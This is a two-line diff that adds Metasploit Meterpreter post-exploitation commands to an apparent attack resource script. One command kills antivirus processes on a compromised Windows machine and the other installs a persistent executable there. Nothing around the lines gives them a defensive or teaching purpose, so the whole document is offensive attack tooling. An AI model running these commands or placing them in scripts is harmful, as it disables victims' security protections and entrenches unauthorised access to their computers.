@@ -1,0 +1,2 @@
+run post/windows/manage/killav
+run post/windows/manage/persistence_exe
